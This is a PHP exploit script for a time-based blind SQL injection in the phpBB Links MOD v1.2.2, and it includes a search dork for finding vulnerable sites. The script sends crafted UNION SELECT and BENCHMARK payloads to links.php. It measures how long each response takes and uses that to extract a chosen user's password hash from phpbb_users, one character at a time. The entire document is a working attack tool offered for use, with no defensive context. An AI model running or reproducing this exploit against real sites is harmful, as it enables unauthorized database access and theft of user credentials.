<?php
echo "------------------------------------------------------------\n";
echo "phpBB Links MOD Remote Blind SQL Injection Exploit\n";
echo "exploit by flyh4t(cnsst.org)\n";
echo "bug found by Love Fly\n";
echo "dork:Links MOD v1.2.2 by phpBB2\n";
echo "------------------------------------------------------------\n";

if ($argc<2) {
echo "USAGE:\n";
echo "~~~~~~\n";
echo "php {$argv[0]} [url] OPTIONS\n\n";
echo "[url]        - target server where phpbb is installed\n\n";
echo "OPTIONS:\n";
echo "-id=<id>     - use specific user id (default 1)\n";
echo "-c=<count>   - benchmark()'s loop count (default 500000)\n";
echo "tip:\n";
echo "use bigger number of <count> if server is slow\n\n";
die;
}

error_reporting(0);
set_time_limit(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",20);
$url = $argv[1];
for($i=2;$i<$argc;$i++) {
   if(strpos($argv[$i],"=")!==false) {
       $exploded=explode("=",$argv[$i]);
         if ($exploded[0]=='-id') $id = $exploded[1];
       if ($exploded[0]=='-c') $benchmark = $exploded[1];
   }
   elseif($argv[$i] == '-v') $verbose=true;
}
if (!isset($id)) $id = 2;
if (!isset($benchmark)) $benchmark = 500000;
if (!isset($verbose)) $verbose=false;

$url_parts = parse_url($url);
$host = $url_parts['host'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$path = $url_parts['path'];
$query_pattern = "-99+union+select+user_password,IF(%s,BENCHMARK(%d,MD5(31337)),1)+FROM+phpbb_users+WHERE+user_id=$id/*";
print "[~] Testing probe delays...\n";
$ok=true; $nodelay=0; $withdelay=0;
for ($i=1;$i<=3;$i++){
   $query = sprintf($query_pattern, "1=1", 1);
   $fdelay = get($query);
   if ($fdelay!==false) $nodelay+=$fdelay; else {$ok=false;break;}
   $query = sprintf($query_pattern, "1=1", $benchmark);
   $sdelay = get($query);
   if ($sdelay!==false) $withdelay+=$sdelay;  else {$ok=false;break;}
   if ($sdelay<=($fdelay*2)) {$ok=false;break;}
   usleep($benchmark/1000); $delay=false;
}
if ($ok) {
   $nondelayed = $nodelay/3;
   print "[+] Average nondelayed queries response time: ".round($nondelayed,1)." dsecs\n";
   $delayed = $withdelay/3;
   print "[+] Average delayed queries response time: ".round($delayed,1)." dsecs\n";
}
else die("[-] Exploit failed\n");
print "    Getting hash...";
if ($verbose) {print "\r[~]"; print "\n";}
$hash='';
for($i=1; $i<=32; $i++) {
   $chr = gethashchar($i);
   if($chr!==false) $hash .= $chr;
   else {
       $chr = gethashchar($i);
       if ($chr !==false)$hash .= $chr;
       else die("\n[-] Exploit failed\n");          }   }
if (!$verbose) {print "\r[~]"; print "\n";}
print "[+] Result: {$hash}\n";

function gethashchar ($pos) {
   global $query_pattern,$prefix,$id,$benchmark,$verbose;
   $inj = "ORD(SUBSTRING(user_password,{$pos},1))";
   $query = sprintf($query_pattern, $inj.">57", $benchmark*4);
   $success = condition($query);
   if (!$success) {
       if ($verbose) print "[v] Position {$pos}: char is [0-9]\n";
       $min = 48;
       $max = 57;          }
   else {
       if ($verbose) print "[v] Position {$pos}: char is [a-f]\n";
       $min = 97;
       $max = 102;          }
   for($i=$min;$i<=$max;$i++) {
       $query = sprintf($query_pattern, $inj."=".$i, $benchmark*4);
       $success = condition($query);
       if ($success) {
           $query = sprintf($query_pattern, $inj."<>".$i, $benchmark*4);
           $recheck = condition($query);
           if (!$recheck) {
               $chr = chr($i);
               if ($verbose) print "[v] Position {$pos}: char is {$chr}\n";
               return $chr;
           }
       }
   }
   return false;
}
function condition($query) {
   global $delayed,$benchmark,$verbose;
   for($attempt = 1; $attempt <= 10; $attempt++){
       $delay = get($query,true);
       if ($delay === false) {
           if ($verbose) print "[v] Attempt {$attempt}: error\n";
       }
       else {
           if ($verbose) print "[v] Attempt {$attempt}: success (delay is {$delay} dsecs)\n";                      break;
       }
   }
   if ($attempt == 11) die("[-] Exploit failed\n");
   if($delay > ($delayed * 2)) {
       usleep(($benchmark*4)/1000);
       return true;      }
   return false;
}
function get($query,$gethash=false) {
   global $host,$port,$path,$verbose;
   if ($gethash&&!$verbose) status();
   $start = getmicrotime();
   $ock = fsockopen(gethostbyname($host),$port);
   if (!$ock) return false;
   else {
       $packet  = "GET {$path}links.php?t=sub_pages&cat={$query} HTTP/1.0\r\n";
       $packet .= "Host: {$host}\r\n";
       $packet .= "User-Agent: InAttack User Agent\r\n";
       $packet .= "Connection: Close\r\n\r\n";
       fputs($ock, $packet);
       $html='';
       while (!feof($ock)) $html.=fgets($ock);
       $end = getmicrotime();
         }
   return intval(($end-$start)*10);
}
function status() {
   static $n;
   $n++;
   if ($n > 3) $n = 0;
   if($n==0){ print "\r[-]\r"; }
   if($n==1){ print "\r[\\]\r";}
   if($n==2){ print "\r[|]\r"; }
   if($n==3){ print "\r[/]\r"; }
}
function getmicrotime() {return array_sum(explode(" ", microtime()));}
?>
